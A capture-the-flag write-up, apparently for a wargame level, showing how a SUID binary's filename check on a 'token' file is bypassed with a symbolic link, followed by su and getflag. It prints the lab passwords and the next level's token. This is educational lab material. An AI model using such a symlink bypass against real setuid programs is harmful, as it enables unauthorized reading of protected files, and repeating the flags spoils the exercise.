# LEVEL 08

> [!TIP]
> user: `level08` <br>
> pass: `fiumuikeil55xe9cu4dood66h`

## STEP 01

An `ls` on the home of level08, we can see that we have:
1. a binary **level08** with SUID and owned by **flag08**
2. a **token** file owned by **flag08** and only readable for the owner

A little execution of the binary show us that the it will try to read a file

```bash
./level08
#./level08 [file to read]
```

As we provide the **token** file, the binary, after checking with a `strstr`,
gently refuse the acces to it.
```bash
ltrace ./level08 ./token
#__libc_start_main(0x8048554, 2, 0xbffff6c4, 0x80486b0, 0x8048720 <unfinished ...>
#strstr("./token", "token")                                 = "token"
#printf("You may not access '%s'\n", "./token"You may not access './token'
#)             = 29
#exit(1 <unfinished ...>
#+++ exited (status 1) +++
```

> [!NOTE]
> so our threat here is that the binary only check for the **literal** file name

> [!TIP]
> A way of doing it is to create a symoblic link that point to the **token** file
> <br><br>
> Executing the following command will give you the password of flag08
>
> ```bash
> ln -s ${PWD}/token /tmp/f; ${HOME}/level08 /tmp/f
> #quif5eloekouj29ke0vouxean
> su flag08
> #Password:
> #Don't forget to launch getflag !
> getflag
> #Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
> ```

> [!IMPORTANT]
> the password for the next level is `25749xKZ8L7DkSCwJkT9dyv6f`
